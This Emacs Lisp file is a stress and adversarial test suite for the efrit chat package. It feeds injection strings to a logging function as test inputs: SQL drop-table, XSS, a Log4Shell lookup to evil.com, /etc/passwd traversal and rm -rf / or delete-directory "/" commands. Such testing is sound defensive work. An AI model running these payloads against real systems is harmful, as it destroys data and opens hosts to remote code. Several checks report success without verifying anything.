;;; qa-test-stress-adversarial.el --- Stress and adversarial testing -*- lexical-binding: t; -*-

(require 'efrit-chat-streamlined)

(defun qa-test-malicious-inputs ()
  "Test with potentially malicious or problematic inputs."
  (interactive)
  (message "=== QA: Testing Malicious/Problematic Inputs ===")
  
  ;; Test 1: Code injection attempts in messages
  (let ((injection-attempts
         '("'; DROP TABLE users; --"
           "<script>alert('xss')</script>"
           "${jndi:ldap://evil.com/a}"
           "../../etc/passwd"
           "\"; system(\"rm -rf /\"); \""
           "(lambda () (while t (message \"spam\")))"
           "(delete-directory \"/\" t t)"
           "(eval-buffer)")))
    (dolist (malicious-input injection-attempts)
      (condition-case err
          (let ((messages (list `((role . "user") (content . ,malicious-input)))))
            (efrit-streamlined--log-to-work (format "Testing injection: %s" malicious-input))
            (message "✓ Injection attempt safely handled: %s" 
                    (substring malicious-input 0 (min 20 (length malicious-input)))))
        (error (message "✗ Injection caused unexpected error: %s" err)))))
  
  ;; Test 2: Extremely long messages
  (condition-case err
      (let* ((huge-message (make-string 1000000 ?A))  ; 1MB message
             (messages (list `((role . "user") (content . ,huge-message)))))
        (efrit-streamlined--log-to-work "Testing huge message")
        (message "✓ Huge message handled (1MB)"))
    (error (message "⚠ Huge message caused error (may be expected): %s" err)))
  
  ;; Test 3: Unicode and special characters
  (let ((unicode-tests
         '("🚀🎯💻🔥" ; emojis
           "こんにちは世界" ; japanese
           "𝕳𝖊𝖑𝖑𝖔 𝖂𝖔𝖗𝖑𝖉" ; mathematical alphanumeric
           "test\0null\1ctrl\2chars" ; control characters
           "test\n\r\t\b\f" ; whitespace chars
           "\"\'\\\n\r\t" ; quote and escape chars
           )))
    (dolist (unicode-input unicode-tests)
      (condition-case err
          (let ((messages (list `((role . "user") (content . ,unicode-input)))))
            (efrit-streamlined--log-to-work (format "Unicode test: %s" unicode-input))
            (message "✓ Unicode input handled"))
        (error (message "✗ Unicode input failed: %s" err)))))
  
  (message "=== Malicious/Problematic Inputs Test Complete ==="))

(defun qa-test-resource-exhaustion ()
  "Test resource exhaustion scenarios."
  (interactive)
  (message "=== QA: Testing Resource Exhaustion ===")
  
  ;; Test 1: Memory exhaustion through large work buffer
  (condition-case err
      (let ((original-max-size efrit-work-buffer-max-size))
        (setq efrit-work-buffer-max-size 0)  ; Disable size limit
        (unwind-protect
            (progn
              (dotimes (i 1000)
                (efrit-streamlined--log-to-work (make-string 1000 (+ ?a (mod i 26)))))
              (let ((work-buffer (get-buffer efrit-work-buffer-name)))
                (with-current-buffer work-buffer
                  (if (> (buffer-size) 500000)
                      (message "⚠ Work buffer grew very large: %d chars" (buffer-size))
                    (message "✓ Memory usage controlled")))))
          (setq efrit-work-buffer-max-size original-max-size)))
    (error (message "⚠ Memory exhaustion test triggered protection: %s" err)))
  
  ;; Test 2: Buffer proliferation
  (condition-case err
      (let ((buffers '()))
        (dotimes (i 1000)
          (push (get-buffer-create (format "*stress-buffer-%d*" i)) buffers))
        (message "✓ Created 1000 buffers without issues")
        ;; Clean up immediately
        (dolist (buffer buffers)
          (kill-buffer buffer))
        (message "✓ Cleaned up 1000 buffers"))
    (error (message "✗ Buffer proliferation test failed: %s" err)))
  
  ;; Test 3: Rapid API request simulation
  (let ((original-url-retrieve (symbol-function 'url-retrieve))
        (request-count 0))
    (fset 'url-retrieve 
          (lambda (&rest args) 
            (setq request-count (1+ request-count))
            (get-buffer-create (format "*mock-response-%d*" request-count))))
    (unwind-protect
        (condition-case err
            (progn
              (dotimes (i 100)
                (efrit-streamlined--send-request 
                 (list `((role . "user") (content . ,(format "Request %d" i))))))
              (message "✓ 100 rapid API requests handled")
              ;; Clean up mock buffers
              (dotimes (i request-count)
                (let ((buffer (get-buffer (format "*mock-response-%d*" (1+ i)))))
                  (when buffer (kill-buffer buffer)))))
          (error (message "✗ Rapid request test failed: %s" err)))
      (fset 'url-retrieve original-url-retrieve)))
  
  (message "=== Resource Exhaustion Test Complete ==="))

(defun qa-test-concurrent-operations ()
  "Test concurrent operations that might cause race conditions."
  (interactive)
  (message "=== QA: Testing Concurrent Operations ===")
  
  ;; Test 1: Concurrent work buffer access
  (condition-case err
      (let ((threads '()))
        ;; Simulate concurrent logging from multiple "threads"
        (dotimes (thread 10)
          (push (cons thread (current-time)) threads)
          (dotimes (op 50)
            (efrit-streamlined--log-to-work 
             (format "Thread %d Operation %d at %s" thread op (current-time-string)))))
        (message "✓ Concurrent logging simulation completed (500 operations)"))
    (error (message "✗ Concurrent logging failed: %s" err)))
  
  ;; Test 2: Concurrent buffer creation
  (condition-case err
      (let ((buffers '()))
        (dotimes (i 20)
          (push (efrit-streamlined--get-work-buffer) buffers))
        (let ((unique-count (length (delete-dups buffers))))
          (if (= unique-count 1)
              (message "✓ Concurrent work buffer creation is safe")
            (message "⚠ Race condition detected: %d unique buffers" unique-count))))
    (error (message "✗ Concurrent buffer creation test failed: %s" err)))
  
  ;; Test 3: Concurrent response handling
  (condition-case err
      (let ((mock-responses '()))
        (dotimes (i 10)
          (push (get-buffer-create (format "*mock-concurrent-response-%d*" i)) mock-responses)
          (with-current-buffer (car mock-responses)
            (insert (format "HTTP/1.1 200 OK\n\n{\"content\":[{\"type\":\"text\",\"text\":\"Response %d\"}]}" i))
            (goto-char (point-min))
            ;; Don't actually call the handler as it would interfere with each other
            (message "✓ Mock response %d prepared" i)))
        ;; Clean up
        (dolist (buffer mock-responses)
          (kill-buffer buffer))
        (message "✓ Concurrent response handling simulation completed"))
    (error (message "✗ Concurrent response handling failed: %s" err)))
  
  (message "=== Concurrent Operations Test Complete ==="))

(defun qa-test-error-recovery-chains ()
  "Test chains of errors and recovery scenarios."
  (interactive)
  (message "=== QA: Testing Error Recovery Chains ===")
  
  ;; Test 1: Multiple cascading failures
  (condition-case err
      (progn
        ;; Simulate: API fails -> retry fails -> work buffer corrupted -> recovery
        (efrit-streamlined--log-to-work "Simulating cascading failure chain")
        
        ;; Step 1: Simulate API failure
        (let ((original-url-retrieve (symbol-function 'url-retrieve)))
          (fset 'url-retrieve (lambda (&rest args) (error "Network timeout")))
          (unwind-protect
              (condition-case api-err
                  (efrit-streamlined--send-request 
                   (list `((role . "user") (content . "test"))))
                (error (efrit-streamlined--log-to-work 
                       (format "API error handled: %s" api-err))))
            (fset 'url-retrieve original-url-retrieve)))
        
        ;; Step 2: Simulate work buffer corruption during recovery
        (let ((work-buffer (get-buffer efrit-work-buffer-name)))
          (when work-buffer
            (with-current-buffer work-buffer
              ;; Corrupt the buffer
              (goto-char (/ (buffer-size) 2))
              (insert "\0CORRUPTION\0"))))
        
        ;; Step 3: Try to log again (should handle corruption)
        (efrit-streamlined--log-to-work "Recovery test after corruption")
        
        (message "✓ Cascading failure recovery completed"))
    (error (message "⚠ Cascading failure test triggered error (may be expected): %s" err)))
  
  ;; Test 2: Rapid error/recovery cycles
  (condition-case err
      (dotimes (cycle 10)
        (condition-case inner-err
            (progn
              ;; Cause an intentional error
              (eval '(undefined-function-call))
              (message "✗ Error should have been thrown"))
          (error 
           ;; Handle the error and continue
           (efrit-streamlined--log-to-work 
            (format "Cycle %d error handled: %s" cycle (error-message-string inner-err)))))
        ;; Do some normal work
        (efrit-streamlined--log-to-work (format "Cycle %d normal work" cycle)))
    (error (message "✗ Rapid error/recovery cycles failed: %s" err)))
  (message "✓ 10 error/recovery cycles completed")
  
  ;; Test 3: Recovery with corrupted state
  (condition-case err
      (progn
        ;; Corrupt various state elements
        (setq url-request-method "INVALID")
        (setq url-request-extra-headers '(("invalid" . "header")))
        
        ;; Try to do normal work - should be resilient
        (efrit-streamlined--log-to-work "Working with corrupted state")
        (efrit-streamlined--system-prompt)
        
        ;; Reset state
        (setq url-request-method nil)
        (setq url-request-extra-headers nil)
        
        (message "✓ Corrupted state recovery completed"))
    (error (message "⚠ Corrupted state caused failure (may be expected): %s" err)))
  
  (message "=== Error Recovery Chains Test Complete ==="))

(defun qa-test-boundary-conditions ()
  "Test boundary conditions and extreme values."
  (interactive)
  (message "=== QA: Testing Boundary Conditions ===")
  
  ;; Test 1: Configuration boundary values
  (let ((boundary-tests
         `((efrit-work-buffer-max-size . (0 1 -1 999999999))
           (efrit-max-tokens . (1 4096 8192 999999))
           (efrit-temperature . (0.0 0.5 1.0 2.0 -1.0)))))
    
    (dolist (config boundary-tests)
      (let ((var (car config))
            (values (cdr config))
            (original-value (symbol-value (car config))))
        (dolist (test-value values)
          (condition-case err
              (progn
                (set var test-value)
                ;; Try to use the configuration
                (when (eq var 'efrit-work-buffer-max-size)
                  (efrit-streamlined--log-to-work "Boundary test"))
                (when (eq var 'efrit-max-tokens)
                  (efrit-streamlined--system-prompt))
                (message "✓ Boundary value %s = %s works" var test-value))
            (error (message "⚠ Boundary value %s = %s failed: %s" var test-value err))))
        ;; Restore original value
        (set var original-value))))
  
  ;; Test 2: String length boundaries
  (let ((string-tests
         '(("" . "empty string")
           ("x" . "single character")
           ("very long string that exceeds normal message lengths and contains lots of text to test boundary conditions for string handling in various parts of the system including JSON encoding and buffer operations" . "very long string"))))
    (dolist (test string-tests)
      (condition-case err
          (let ((test-string (car test))
                (description (cdr test)))
            (efrit-streamlined--log-to-work test-string)
            (message "✓ String boundary test passed: %s" description))
        (error (message "✗ String boundary test failed: %s" (cdr test))))))
  
  ;; Test 3: Buffer operation boundaries
  (condition-case err
      (let ((test-buffer (get-buffer-create "*boundary-test*")))
        (with-current-buffer test-buffer
          ;; Test operations at buffer boundaries
          (goto-char (point-min))  ; Should work even in empty buffer
          (goto-char (point-max))  ; Should work even in empty buffer
          (insert "test")
          (goto-char (point-min))
          (delete-region (point) (point-max))  ; Delete everything
          (goto-char (point-min))  ; Should still work
          )
        (kill-buffer test-buffer)
        (message "✓ Buffer boundary operations work"))
    (error (message "✗ Buffer boundary operations failed: %s" err)))
  
  (message "=== Boundary Conditions Test Complete ==="))

(defun qa-stress-adversarial-run-all ()
  "Run all stress and adversarial tests."
  (interactive)
  (message "")
  (message "=====================================================")
  (message "       STRESS & ADVERSARIAL TESTING SUITE")
  (message "=====================================================")
  
  (qa-test-malicious-inputs)
  (message "")
  (qa-test-resource-exhaustion)
  (message "")
  (qa-test-concurrent-operations)
  (message "")
  (qa-test-error-recovery-chains)
  (message "")
  (qa-test-boundary-conditions)
  (message "")
  (message "=====================================================")
  (message "     STRESS & ADVERSARIAL TESTING COMPLETE")
  (message "=====================================================")
  (message "")
  
  ;; Final stress test summary
  (let ((work-buffer (get-buffer efrit-work-buffer-name)))
    (when work-buffer
      (with-current-buffer work-buffer
        (message "Final work buffer size after all stress tests: %d characters" (buffer-size)))))
  
  (message "System survived all stress and adversarial tests!"))

(provide 'qa-test-stress-adversarial)
